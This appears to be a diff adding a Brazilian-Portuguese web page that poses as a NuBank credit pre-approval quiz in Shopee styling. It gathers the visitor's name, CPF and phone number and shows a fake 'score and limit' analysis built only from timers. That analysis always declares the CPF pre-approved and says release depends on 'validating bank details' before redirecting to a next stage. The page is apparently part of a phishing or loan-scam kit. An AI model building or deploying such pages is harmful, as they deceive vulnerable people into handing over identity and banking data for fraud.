+                            <div class="flex justify-between items-center mb-4">
+                                <span class="text-sm font-medium text-gray-700">Verificando score</span>
+                                <span class="text-sm text-gray-400" id="statusScore"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-4">
+                                <span class="text-sm font-medium text-gray-700">Consultando limite</span>
+                                <span class="text-sm text-gray-400" id="statusLimite"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-4" id="analiseBeneficios">
+                                <span class="text-sm font-medium text-gray-700">Analisando benefícios</span>
+                                <span class="text-sm text-gray-400" id="statusBeneficios"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+                            </div>
+                            <div class="flex justify-between items-center mb-4" id="analiseRendimentos">
+                                <span class="text-sm font-medium text-gray-700">Calculando rendimentos</span>
+                                <span class="text-sm text-gray-400" id="statusRendimentos"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+                            </div>
+                            <div class="flex justify-between items-center" id="analiseAprovacao">
+                                <span class="text-sm font-medium text-gray-700">Processando aprovação</span>
+                                <span class="text-sm text-gray-400" id="statusAprovacao"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+                            </div>
+                        </div>
+
+                        <div class="w-full max-w-xs mx-auto bg-gray-100 h-2 rounded-full overflow-hidden">
+                            <div id="loadingProgressBar" class="h-full bg-shopee w-0 transition-all duration-500 ease-out"></div>
+                        </div>
+
+                        <p class="text-gray-500 mt-4 text-sm">
+                            Isso pode levar alguns segundos...
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Resultado (oculto inicialmente) -->
+                <div id="quizResult" class="quiz-question hidden">
+                    <div class="text-center py-6">
+                        <div class="bg-green-100 p-4 rounded-full inline-flex items-center justify-center mb-4">
+                            <i class="fas fa-check-circle text-green-500 text-4xl"></i>
+                        </div>
+                        <h2 class="text-2xl font-bold text-gray-800 mb-2">
+                            Seu CPF foi pré-aprovado
+                        </h2>
+                        <div class="bg-shopee-light bg-opacity-10 p-4 rounded-xl my-4">
+                            <div class="flex items-center">
+                                <div class="text-shopee mr-3">
+                                    <i class="fas fa-lock text-xl"></i>
+                                </div>
+                                <p class="text-left text-gray-700">
+                                    Liberação imediata mediante validação de dados bancários.
+                                </p>
+                            </div>
+                        </div>
+                        <p class="text-gray-600 mb-6">
+                            Parabéns! Você está a um passo de receber o seu crédito
+                            NuBank. Complete a validação para liberar seu limite.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botões de navegação -->
+            <div class="mt-auto">
+                <button id="btnNext" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine hidden">
+                    Continuar
+                </button>
+
+                <button id="btnSolicitar" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine hidden" style="margin-bottom:100px">
+                    Solicitar liberação
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+
+            if (!dadosUsuarioJSON) {
+                alert(
+                    "Dados do usuário não encontrados. Você será redirecionado para o início."
+                );
+
+                window.location.href = "../" + window.location.search;
+
+                return;
+            }
+
+            // Tentar analisar os dados JSON
+            try {
+                const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+
+                if (!dadosUsuario.nome || !dadosUsuario.cpf) {
+
+                    console.error("Dados do usuário incompletos:", dadosUsuario);
+
+                    alert("Dados incompletos. Você será redirecionado para o início.");
+
+                    window.location.href = "../" + window.location.search;
+
+                    return;
+                }
+
+                localStorage.removeItem("nomeCompleto");
+
+                localStorage.removeItem("cpfUsuario");
+            } catch (error) {
+                console.error("Erro ao analisar dados do usuário:", error);
+
+                alert(
+                    "Erro ao processar seus dados. Você será redirecionado para o início."
+                );
+
+                window.location.href = "../" + window.location.search;
+
+                return;
+            }
+
+            // Elementos do Quiz
+            const progressBar = document.getElementById("progressBar");
+            const progressText = document.getElementById("progressText");
+            const btnNext = document.getElementById("btnNext");
+            const btnSolicitar = document.getElementById("btnSolicitar");
+            const btnVoltar = document.getElementById("btnVoltar");
+            const btnConfirmarTelefone = document.getElementById(
+                "btnConfirmarTelefone"
+            );
+
+            // Estado do quiz
+            let currentQuestion = 1;
+            const totalQuestions = 8;
+            const userAnswers = {};
+            let telefone = "";
+            let nomeCompleto = "";
+            let cpfUsuario = "";
+            let analysisStarted = false; // Flag para controlar o início da análise
+
+            // Atualizar progresso
+            function updateProgress() {
+                const progress = (currentQuestion / totalQuestions) * 100;
+                progressBar.style.width = `${progress}%`;
+                progressText.textContent = `${currentQuestion}/${totalQuestions}`;
+            }
+
+            // Iniciar sequência de análise
+            function startAnalysis() {
+                // Evitar que a análise inicie mais de uma vez
+                if (analysisStarted) return;
+                analysisStarted = true;
+
+                const loadingBar = document.getElementById("loadingProgressBar");
+
+                // Inicializar barra de progresso
+                loadingBar.style.width = "0%";
+
+                // Etapa 1: Verificar score (0-20%)
+                setTimeout(() => {
+                    document.getElementById("statusScore").innerHTML =
+                        '<i class="fas fa-check-circle text-green-500"></i>';
+                    loadingBar.style.width = "20%";
+
+                    // Etapa 2: Consultar limite (20-40%)
+                    setTimeout(() => {
+                        document.getElementById("statusLimite").innerHTML =
+                            '<i class="fas fa-check-circle text-green-500"></i>';
+                        loadingBar.style.width = "40%";
+
+                        // Etapa 3: Analisar benefícios (40-60%)
+                        setTimeout(() => {
+                            document.getElementById("statusBeneficios").innerHTML =
+                                '<i class="fas fa-check-circle text-green-500"></i>';
+                            loadingBar.style.width = "60%";
+
+                            // Etapa 4: Calcular rendimentos (60-80%)
+                            setTimeout(() => {
+                                document.getElementById("statusRendimentos").innerHTML =
+                                    '<i class="fas fa-check-circle text-green-500"></i>';
+                                loadingBar.style.width = "80%";
+
+                                // Etapa 5: Processar aprovação (80-100%)
+                                setTimeout(() => {
+                                    document.getElementById("statusAprovacao").innerHTML =
+                                        '<i class="fas fa-check-circle text-green-500"></i>';
+                                    loadingBar.style.width = "100%";
+
+                                    // Após terminar todas as etapas, mostrar resultado
+                                    setTimeout(() => {
+                                        document
+                                            .getElementById("analysisScreen")
+                                            .classList.add("hidden");
+                                        document
+                                            .getElementById("quizResult")
+                                            .classList.remove("hidden");
+                                        progressText.textContent = "Concluído";
+
+                                        // Mostrar botão de solicitar
+                                        btnSolicitar.classList.remove("hidden");
+                                    }, 700);
+                                }, 1200);
+                            }, 1200);
+                        }, 1200);
+                    }, 1200);
+                }, 1000);
+            }
+
+            // Avançar para a próxima pergunta
+            function goToNextQuestion() {
+                // Ocultar pergunta atual
+                const currentQuestionEl = document.getElementById(
+                    `question${currentQuestion}`
+                );
+                currentQuestionEl.classList.add("hidden");
+
+                if (currentQuestion < totalQuestions) {
+                    // Mostrar próxima pergunta
+                    currentQuestion++;
+                    document
+                        .getElementById(`question${currentQuestion}`)
+                        .classList.remove("hidden");
+                    updateProgress();
+                } else {
+                    // Mostrar tela de análise
+                    document
+                        .getElementById("analysisScreen")
+                        .classList.remove("hidden");
+                    progressBar.style.width = "100%";
+                    progressText.textContent = "Analisando";
+
+                    // Iniciar análise com um pequeno delay para garantir que a tela seja renderizada primeiro
+                    setTimeout(startAnalysis, 300);
+                }
+            }
+
+            // Selecionar opção (agora avança automaticamente)
+            document.querySelectorAll(".quiz-option").forEach((option) => {
+                option.addEventListener("click", function () {
+                    const questionNumber = this.getAttribute("data-question");
+                    const questionEl = document.getElementById(
+                        `question${questionNumber}`
+                    );
+
+                    // Desselecionar outras opções da mesma pergunta
+                    questionEl.querySelectorAll(".quiz-option").forEach((opt) => {
+                        opt.classList.remove("selected");
+                        opt.querySelector(".option-selected").classList.add("hidden");
+                    });
+
+                    // Selecionar esta opção
+                    this.classList.add("selected");
+                    this.querySelector(".option-selected").classList.remove("hidden");
+
+                    // Armazenar resposta
+                    const answerValue = this.getAttribute("data-value");
+                    userAnswers[questionNumber] = answerValue;
+
+                    // Pequeno delay antes de avançar para dar feedback visual
+                    setTimeout(() => {
+                        goToNextQuestion();
+                    }, 300);
+                });
+            });
+
+            // Botão de confirmar telefone
+            btnConfirmarTelefone.addEventListener("click", function () {
+                const telefoneInput = document.getElementById("telefoneInput");
+
+                if (!telefoneInput.value) {
+                    alert("Por favor, informe seu telefone para continuar.");
+
+                    return;
+                }
+
+                telefone = telefoneInput.value;
+
+                localStorage.setItem('telephone', telefone);
+                
+                goToNextQuestion();
+            });
+
+            // Botão Solicitar Liberação
+            btnSolicitar.addEventListener("click", function () {
+                console.clear();
+
+                const telefoneFormatado = telefone.replace(/\D/g, "");
+
+                if (!telefoneFormatado || telefoneFormatado.length < 10) {
+                    alert("Por favor, informe um telefone válido.");
+
+                    return;
+                }
+
+                const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+
+                if (!dadosUsuarioJSON) {
+                    console.error("Dados do usuário não encontrados no localStorage");
+
+                    alert(
+                        "Dados do usuário não encontrados. Por favor, reinicie o processo."
+                    );
+
+                    window.location.href = "../" + window.location.search;
+
+                    return;
+                }
+
+                try {
+                    const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+
+                    console.log("Dados do usuário objeto:", dadosUsuario);
+
+                    if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+                        console.error(
+                            "Dados de CPF ou nome não encontrados:",
+
+                            dadosUsuario
+                        );
+
+                        alert("Dados incompletos. Por favor, reinicie o processo.");
+
+                        window.location.href = "../" + window.location.search;
+
+                        return;
+                    }
+
+                    // Formato limpo do CPF (apenas números)
+                    const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
+
+                    // Mapear valores das respostas para valores mais legíveis
+                    const mapearValorEmprestimo = {
+                        "500-1000": "R$500 - R$1.000",
+                        "1001-3000": "R$1.001 - R$3.000",
+                        "3001-5000": "R$3.001 - R$5.000",
+                        acima5000: "Acima de R$5.000",
+                    };
+
+                    const mapearRendaFixa = {
+                        "carteira-assinada": "Sim, carteira assinada",
+                        autonomo: "Sim, autônomo",
+                        "sem-renda": "Não tenho renda fixa",
+                    };
+
+                    const mapearSolicitouCredito = {
+                        aprovado: "Sim, foi aprovado",
+                        negado: "Sim, foi negado",
+                        nao: "Não",
+                    };
+
+                    const mapearFinalidadeCredito = {
+                        "pagar-contas": "Pagar contas",
+                        "investir-negocio": "Investir no próprio negócio",
+                        "comprar-algo": "Comprar algo importante",
+                        "uso-pessoal": "Uso pessoal",
+                    };
+
+                    // Preparar dados para enviar ao servidor
+                    const dadosParaSalvar = {
+                        nome: dadosUsuario.nome,
+                        cpf: cpfLimpo,
+                        telefone: telefoneFormatado,
+                        valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
+                        renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
+                        negativado:
+                            userAnswers["3"] === "sim"
+                                ? "Sim"
+                                : userAnswers["3"] === "nao"
+                                    ? "Não"
+                                    : "Não sei",
+                        solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
+                        dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
+                        finalidade_credito:
+                            mapearFinalidadeCredito[userAnswers["6"]] || "",
+                        cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
+                    };
+
+                    window.location.href = "../03" + window.location.search;
+                } catch (error) {
+                    console.error("Erro ao processar dados:", error);
+
+                    alert("Erro ao processar dados. Por favor, reinicie o processo.");
+
+                    window.location.href = "../" + window.location.search;
+                }
+            });
+
+            // Botão Voltar
+            btnVoltar.addEventListener("click", function () {
+                window.history.back();
+            });
+
+            // Inicializar progresso
+            updateProgress();
+
+            // Mascara para o telefone
+            const telefoneInput = document.getElementById("telefoneInput");
+            if (telefoneInput) {
+                telefoneInput.addEventListener("input", function (e) {
+                    let value = e.target.value.replace(/\D/g, "");
+                    if (value.length > 11) value = value.substring(0, 11);
+
+                    if (value.length > 2 && value.length <= 6) {
+                        value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
+                    } else if (value.length > 6) {
+                        value = `(${value.substring(0, 2)}) ${value.substring(
+                            2,
+                            7
+                        )}-${value.substring(7)}`;
+                    }
+
+                    e.target.value = value;
+                });
+            }
+        });
+    </script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;6a660f4251d346ff9fb1270e7abf5c3e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+
+</body></html>
